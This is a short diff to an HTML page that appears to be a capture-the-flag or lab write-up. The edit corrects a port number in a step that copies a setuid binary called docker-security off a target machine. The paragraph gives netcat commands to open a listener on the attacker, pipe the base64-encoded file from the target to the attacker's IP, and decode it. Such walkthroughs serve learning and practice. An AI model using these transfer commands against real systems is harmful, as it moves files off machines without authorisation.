@@ -161,7 +161,7 @@ docker-security: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), 
 
                 <p>
                     Open up a listener on the attacker with <span>nc -lvnp 4445 > docker-security.b64</span> and send it
-                    from the target with <span>cat docker-security | base64 | nc 10.10.14.74 4444</span>. Then decode it
+                    from the target with <span>cat docker-security | base64 | nc 10.10.14.74 4445</span>. Then decode it
                     with <span>base64 -d docker-security.b64 > docker-security</span>.
                 </p>
 
